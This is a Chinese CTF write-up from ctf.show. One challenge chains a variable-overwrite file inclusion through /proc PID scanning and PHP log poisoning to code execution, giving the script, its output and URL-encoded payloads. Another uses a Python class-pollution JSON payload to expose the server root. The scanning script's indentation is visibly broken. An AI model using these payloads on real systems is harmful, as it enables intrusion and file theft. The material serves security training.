接下来我们的目标就是找到日志所在点了。

但这边我就不会了，本来学到上面的错误文件执行已经是我的极限了，后面找这个日志我是真不行。

我就直接让ai给我代码了。

    import requests
    import json
    import time
    import urllib3
    
    # 1. 基础配置
    
    # -------------------------------------------------------
    
    # 禁用 HTTPS 证书警告（CTF 题目很多是自签名证书，不禁用会满屏报错）
    
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # 🎯 目标 URL：请替换为你当前的题目靶机地址
    
    # 注意：必须以 / 结尾，例如 http://ip:port/
    
    TARGET_URL = "https://7bad1824-e49a-4e34-9620-57039c589b0d.challenge.ctf.show/"
    
    def find_webroot():
        print(f"[+] 开始扫描 PID，目标: {TARGET_URL}")
        print("[+] 正在尝试读取 /proc/[PID]/cmdline ...")
    # 2. 爆破循环
    # -------------------------------------------------------
    # 为什么是 1 到 300？
    # 在 Docker 容器中，PID 通常很小。
    # PID 1 通常是入口进程，PID 2-20 通常是其启动的子进程。
    # 只要找到其中一个保留了原始启动命令的进程即可。
    for pid in range(1, 300):
        
        # 3. 构造 Payload (核心攻击点)
        # ---------------------------------------------------
        # 漏洞原理：变量覆盖导致 LFI
        # 我们利用 extract($vars) 覆盖了内部变量 $__template_path__
        # 将其指向 Linux 的进程信息文件 /proc/[PID]/cmdline
        target_file = f"/proc/{pid}/cmdline"
        
        payload_data = {
            "name": "guest",                # 满足 if(data['name'] == 'guest') 的前置条件
            "__template_path__": target_file # 恶意的路径变量
        }
    
        try:
            # 4. 发送请求
            # -----------------------------------------------
            # Webman 接收的是 data 参数，且需要是 JSON 字符串格式
            r = requests.get(
                url=TARGET_URL + 'index/testJson',
                params={"data": json.dumps(payload_data)}, # 自动将字典转为 JSON 字符串
                verify=False, # 不验证 SSL 证书
                timeout=2     # 设置超时，防止卡死
            )
    
            # 5. 结果分析 (特征匹配)
            # -----------------------------------------------
            # 我们的目标是找到启动命令，例如： "php /var/www/html/app/start.php start"
            # 所以我们搜索 "start.php" 这个关键词。
            if "start.php" in r.text:
                print(f"\n[!] 在 PID: {pid} 发现关键信息！")
                
                # --- 提取路径逻辑 (字符串清洗) ---
                # 返回的内容通常混杂了 null 字节 (\x00) 或者框架的报错信息
                # 典型返回示例: ...start_file=/var/www/html/webrooth1xaa/start.php...
                
                content = r.text
                
                # 尝试提取绝对路径
                # 思路：找到 "start.php" 的位置，向左截取直到遇到路径特征
                if "start_file=" in content:
                    # 这种情况通常出现在框架把变量 dump 出来的时候
                    # split 切割提取
                    temp = content.split("start_file=")[1] 
                    full_path = temp.split(".php")[0] + ".php"
                    
                    # 去掉文件名的部分，只留目录
                    # /var/www/html/webrooth1xaa/start.php -> /var/www/html/webrooth1xaa
                    webroot = full_path.replace("/start.php", "")
                    
                    print(f"✅ 成功提取 Webroot: {webroot}")
                    print(f"📝 完整启动命令痕迹: {full_path}")
                    return webroot
                
                else:
                    # 如果是纯 raw 文本，可能需要人工看一眼
                    print(f"⚠️ 发现 'start.php' 但自动提取失败，请手动分析以下返回内容片段：")
                    print(content[:200]) # 打印前200字符
                    return None
    
        except Exception as e:
            # 网络错误直接跳过
            pass
            
        # 稍微延时，避免请求过快被防火墙拦截（虽然 CTF 环境通常没有）
        # time.sleep(0.05) 
    
    print("\n[-] 扫描结束，未找到 Webroot。")
    return None
    if __name__ == "__main__":
        find_webroot()

```
PS C:\Users\G1731> & C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/scan_pop.py
[+] 开始扫描 PID，目标: https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/
[+] 正在尝试读取 /proc/[PID]/cmdline ...

[!] 在 PID: 8 发现关键信息！
✅ 成功提取 Webroot: /var/www/html/webrooth1xaa
📝 完整启动命令痕迹: /var/www/html/webrooth1xaa/start.php
PS C:\Users\G1731> 
```

成功确认Web 根目录`/var/www/html/webrooth1xaa`

上网查日志路径规则是`runtime/logs/webman-Y-m-d.log`这样的。

所以最终构造 Payload`?data={"name":"guest", "__template_path__": "/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log"}`

到这里，两步绝杀了，首先我们让错误文件上传。

`{"name":"guest", "__template_path__": "<?php `cat /s00* > /var/www/html/webrooth1xaa/public/flag.txt`; ?>"}`

`https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%3C%3Fphp%20%60cat%20%2Fs00%2A%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fpublic%2Fflag.txt%60%3B%20%3F%3E%22%7D`

记得url编码，不然执行不了。

`{"name":"guest", "__template_path__": "/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log"}`

`https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fruntime%2Flogs%2Fwebman-2025-11-27.log%22%7D`

得到日志，最后直接访问`https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/flag.txt`

ctfshow{6a9025fc-8cb0-4de4-90d6-d7275ac512b0}

拿下。



---



# #6.ez_inject

这一题比上面一题简单，我大概花了20分钟的样子。

闲话不说，上题目。

![alt text](/images/QQ20251130-195320.png)

![alt text](/images/QQ20251130-195616.png)

一开始我的思路是命令执行或者SSTI，看起来很像那种白名单黑名单过滤的样子，毕竟我也做过好几次计算机类型的题目。

但试了几次没有结果后，我又转向注册账号，然后用命令获得权限的方向。

![alt text](/images/QQ20251130-195631.png)

随便注册了一个账号发现，又试了试，还是一样的结果，这个时候，我就再看了一下网页。

![alt text](/images/QQ20251130-195638.png)

提示直接甩脸上了。

注册界面的污染。

那不就是JSON污染吗。

```
{
    "username": user,
    "password": "123",
    "__init__": {
        "__globals__": {
            "app": {
                "static_folder": "./../../../../"
            }
        }
    }
}
```

直接让网站去根目录找一下文件，最后直接拿下flag。

**ctfshow{2fb222c8-f22d-4358-b452-07ea1c9376a5}**

总结: 这一题最大的漏洞应该就是网站注册后端存在递归函数，递归函数不断让我们跑到了整个服务器的根目录下，然后重新访问时候就能直接看到整个根目录下的文件。

这里面能学到

`__init__`，初始化方法，所有对象都有。

`__globals__`，全局变量，函数都具有。

`function.__globals__`,全局命名空间字典。

hasattr(     ,     ),代码检查。

isinstance(     ,     ),判断类型。

setattr(object, attribute, value),设置属性，赋值。

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
